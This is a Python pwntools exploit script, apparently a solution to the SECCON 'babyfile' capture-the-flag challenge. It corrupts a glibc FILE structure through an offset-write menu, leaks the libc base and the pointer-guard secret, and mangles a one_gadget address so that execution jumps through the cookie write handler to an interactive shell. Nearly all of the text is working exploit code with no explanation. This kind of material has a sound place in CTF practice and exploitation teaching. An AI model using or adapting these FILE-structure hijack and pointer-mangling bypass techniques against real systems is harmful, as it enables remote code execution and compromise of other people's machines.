#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sla(delim,line): return p.sendlineafter(delim,line)

rop = ROP(exe)

host, port = "babyfile.seccon.games", "3157"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def write(offset, data):
  sla('> ','2')
  sla('offset: ', str(offset))
  sla('value: ', str(data))

def write8(offset,data):
  for i in range(8):
    val = (data>>(i<<3))&0xff
    if (val):
      write(offset+i, val)

# allocate buff
write(0x29,1)
write(0x70,1)	# set fileno
write(0xd8,0xa8)
sla('> ','1')

# fflush to populate buffer pointer
write(0xd8,0xa0)
write(1,0x18)
sla('> ','1')

# fflush second time leaking libc address
write(32,0)
write(40,0xf0)
sla('> ','1')
# calculate libc base
leak = p.recv(0xf0)
libc.address = u64(leak[0x70:0x78]) - 0x1e8f60
logbase()

if args.REMOTE:
  random = libc.address + 0x1f3570
else:
  random = libc.address + 0x1f35f0
logleak('random', random)

write8(0x20, random)
write8(0x28, random+8)
sla('> ', '1')
randval = u64(p.recv(8))
logleak('random value: ', randval)

# jump to cookie_write
io_cookie_write = libc.address + 0x1e8a98
onegadgets = one_gadget(libc.path, libc.address)

rol = lambda val, r_bits, max_bits, rv: \
    ((val^rv) << r_bits%max_bits) & (2**max_bits-1) | \
    (((val^rv) & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# encode onegadget address and jump to it, and get shell
write8(0xf0, rol(onegadgets[1], 0x11, 64, randval))
write8(0x98, io_cookie_write-0x60)
sla('> ','1')
# enjoy shell
p.interactive()


